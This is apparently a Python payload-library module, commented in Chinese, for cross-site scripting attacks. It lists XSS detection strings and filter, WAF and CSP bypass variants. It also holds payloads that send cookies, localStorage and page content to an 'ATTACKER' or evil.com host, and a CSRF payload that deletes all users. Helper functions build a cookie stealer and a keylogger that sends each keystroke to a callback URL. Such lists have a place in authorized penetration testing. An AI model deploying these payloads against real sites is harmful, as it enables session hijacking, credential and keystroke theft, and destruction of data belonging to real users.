"""XSS (Cross-Site Scripting) Payload 生成器.

覆盖:
    - 反射型 XSS 检测 & 利用
    - DOM XSS
    - WAF / 过滤绕过
    - Cookie 窃取
    - CSP 绕过
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  检测 Payload
# ═══════════════════════════════════════════════════════════

DETECTION: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"'><script>alert(1)</script>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\";alert(1)//",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
]


# ═══════════════════════════════════════════════════════════
#  Cookie 窃取 / 数据外传
# ═══════════════════════════════════════════════════════════

EXFILTRATION: List[Dict[str, str]] = [
    {
        "name": "Cookie 窃取 (Image)",
        "payload": "<img src=x onerror=\"this.src='http://ATTACKER/?c='+document.cookie\">",
    },
    {
        "name": "Cookie 窃取 (fetch)",
        "payload": "<script>fetch('http://ATTACKER/?c='+document.cookie)</script>",
    },
    {
        "name": "Cookie 窃取 (new Image)",
        "payload": "<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>",
    },
    {
        "name": "页面内容窃取",
        "payload": "<script>fetch('http://ATTACKER/?d='+btoa(document.body.innerHTML))</script>",
    },
    {
        "name": "LocalStorage 窃取",
        "payload": "<script>for(k in localStorage){new Image().src='http://ATTACKER/?k='+k+'&v='+localStorage[k]}</script>",
    },
    {
        "name": "CSRF + XSS 组合",
        "payload": "<script>\nfetch('/admin/delete?user=all',{method:'POST',credentials:'include'})\n</script>",
    },
]


# ═══════════════════════════════════════════════════════════
#  WAF / 过滤绕过
# ═══════════════════════════════════════════════════════════

BYPASS: Dict[str, List[str]] = {
    "标签名绕过": [
        "<ScRiPt>alert(1)</ScRiPt>",                     # 大小写混合
        "<scr<script>ipt>alert(1)</scr</script>ipt>",     # 标签嵌套
        "<scr\x00ipt>alert(1)</scr\x00ipt>",              # NULL 字节
        "<%73cript>alert(1)</%73cript>",                  # HTML 编码
    ],
    "事件处理器绕过": [
        "<img src=x onerror=alert(1)>",                   # 经典
        "<img src=1 onerror=alert(1)>",                   # 无效src
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # base64 编码
        "<img src=x onerror=window['al'+'ert'](1)>",     # 字符串拼接
        "<img src=x oneonerrorror=alert(1)>",            # 双写绕过
    ],
    "alert 过滤绕过": [
        "<script>prompt(1)</script>",                     # prompt 替代
        "<script>confirm(1)</script>",                    # confirm 替代
        "<script>top['al'+'ert'](1)</script>",           # 字符串拼接
        "<script>(alert)(1)</script>",                    # 括号绕过
        "<script>throw 1</script>",                       # throw 替代
        "<script>console.log(1)</script>",                # console.log
    ],
    "括号过滤绕过": [
        "<script>alert`1`</script>",                      # 模板字符串
        "<script>setTimeout`alert\\x281\\x29`</script>",  # setTimeout
        "<img src=x onerror=alert`1`>",                   # ES6 模板
        "<script>onerror=alert;throw 1</script>",          # throw
    ],
    "引号过滤绕过": [
        "<img src=x onerror=alert(String.fromCharCode(49))>",
        "<script>eval(/\\x61lert(1)/.source)</script>",   # 正则绕过
        '<img src=x onerror=alert(1)>',                    # 无引号
    ],
    "空格过滤绕过": [
        "<img/src=x/onerror=alert(1)>",                   # 斜杠替代
        "<svg/onload=alert(1)>",                           # 自闭合
        "<img%0asrc=x%0aonerror=alert(1)>",               # %0a 替代
        "<img%0dsrc=x%0donerror=alert(1)>",               # %0d 替代
        "<img%09src=x%09onerror=alert(1)>",               # %09 tab
    ],
    "CSP 绕过": [
        "<script src='http://evil.com/payload.js'></script>",  # 需要 CSP 允许
        "<link rel=stylesheet href='http://evil.com/exfil.css'>",  # CSS 外传
        "<base href='http://evil.com/'>",                   # base 劫持
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    ],
    "AngularJS / Vue 绕过": [
        "{{constructor.constructor('alert(1)')()}}",       # Angular
        "{{$on.constructor('alert(1)')()}}",               # Angular
        "{{_openBlock.constructor('alert(1)')()}}",         # Vue
    ],
}


def get_detection() -> List[str]:
    """获取 XSS 检测 Payload."""
    return DETECTION


def get_exfiltration() -> list:
    """获取数据外传 Payload."""
    return EXFILTRATION


def get_bypass(category: str = "") -> dict:
    """获取 WAF 绕过 Payload."""
    if category and category in BYPASS:
        return {category: BYPASS[category]}
    return BYPASS


def generate_cookie_stealer(callback_url: str) -> str:
    """生成 Cookie 窃取 Payload.

    Args:
        callback_url: 接收 Cookie 的 URL
    """
    return f"<script>new Image().src='{callback_url}?c='+document.cookie</script>"


def generate_keylogger(callback_url: str) -> str:
    """生成键盘记录 Payload.

    Args:
        callback_url: 接收按键记录的 URL
    """
    return f"""<script>
document.onkeypress=function(e){{
  fetch('{callback_url}?k='+e.key)
}}
</script>"""
